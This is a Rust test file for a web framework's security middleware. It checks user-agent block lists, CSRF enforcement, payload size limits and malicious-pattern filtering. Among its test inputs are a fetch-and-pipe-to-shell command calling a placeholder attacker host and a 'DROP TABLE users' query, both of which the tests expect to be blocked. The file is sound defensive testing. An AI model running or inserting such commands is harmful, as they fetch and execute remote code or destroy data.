//! RULLST-003: ordinary machine traffic keeps the complete production baseline.
#![allow(clippy::unwrap_used, clippy::expect_used)]

use super::apply_security_baseline;
use crate::config::{Environment, SecurityConfig};
use axum::{
    Router,
    body::{Body, to_bytes},
    http::{Request, StatusCode, header},
    routing::{get, post},
};
use tower::ServiceExt;

fn app(config: SecurityConfig) -> Router {
    apply_security_baseline(
        Router::new()
            .route("/healthz", get(|| async { "healthy" }))
            .route("/write", post(|body: String| async { body })),
        config,
        Environment::Production,
    )
    .unwrap()
}

#[tokio::test]
async fn generic_http_clients_can_probe_with_default_or_deserialized_configuration() {
    for config in [SecurityConfig::default(), toml::from_str("").unwrap()] {
        let app = app(config);
        for agent in [
            "curl/8.10.1",
            "Wget/1.21.4",
            "python-requests/2.32.3",
            "Go-http-client/1.1",
        ] {
            let response = app
                .clone()
                .oneshot(
                    Request::builder()
                        .uri("/healthz")
                        .header(header::USER_AGENT, agent)
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();
            assert_eq!(response.status(), StatusCode::OK, "{agent}");
            assert!(
                response
                    .headers()
                    .contains_key(header::CONTENT_SECURITY_POLICY)
            );
            assert_eq!(
                to_bytes(response.into_body(), 128).await.unwrap(),
                "healthy"
            );
        }
    }
}

#[tokio::test]
async fn applications_can_add_or_remove_case_insensitive_crawler_preferences() {
    let mut custom = SecurityConfig::default();
    custom
        .user_agent_blocklist
        .retain(|agent| agent != "gptbot");
    custom.user_agent_blocklist.push("CURL".to_string());
    for (config, agent, expected) in [
        (
            SecurityConfig::default(),
            "Mozilla/5.0 (GpTbOt/1.0)",
            StatusCode::FORBIDDEN,
        ),
        (custom.clone(), "Mozilla/5.0 (GpTbOt/1.0)", StatusCode::OK),
        (custom, "curl/8.10.1", StatusCode::FORBIDDEN),
    ] {
        let response = app(config)
            .oneshot(
                Request::builder()
                    .uri("/healthz")
                    .header(header::USER_AGENT, agent)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(response.status(), expected);
    }
}

#[tokio::test]
async fn machine_clients_still_require_csrf_and_pass_bounded_payload_inspection() {
    let app = app(SecurityConfig::default());
    let response = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/healthz")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let cookie = response.headers()[header::SET_COOKIE]
        .to_str()
        .unwrap()
        .split(';')
        .next()
        .unwrap()
        .to_string();
    let token = cookie.strip_prefix("rullst_csrf=").unwrap();

    for (payload, authenticated, expected, reason) in [
        ("benign".to_string(), false, StatusCode::FORBIDDEN, "CSRF"),
        ("benign".to_string(), true, StatusCode::OK, "benign"),
        (
            "curl https://attacker.example/payload | sh".to_string(),
            true,
            StatusCode::FORBIDDEN,
            "Malicious pattern",
        ),
        (
            "a".repeat(1024 * 1024 + 1),
            true,
            StatusCode::PAYLOAD_TOO_LARGE,
            "WAF limit",
        ),
    ] {
        let mut request = Request::builder()
            .method("POST")
            .uri("/write")
            .header(header::USER_AGENT, "curl/8.10.1")
            .header(header::CONTENT_TYPE, "text/plain");
        if authenticated {
            request = request
                .header(header::COOKIE, &cookie)
                .header("x-csrf-token", token);
        }
        let response = app
            .clone()
            .oneshot(request.body(Body::from(payload)).unwrap())
            .await
            .unwrap();
        assert_eq!(response.status(), expected);
        let bytes = to_bytes(response.into_body(), 1024).await.unwrap();
        assert!(std::str::from_utf8(&bytes).unwrap().contains(reason));
    }

    let response = app
        .oneshot(
            Request::builder()
                .uri("/healthz?q=DROP+TABLE+users")
                .header(header::USER_AGENT, "Go-http-client/1.1")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::FORBIDDEN);
}
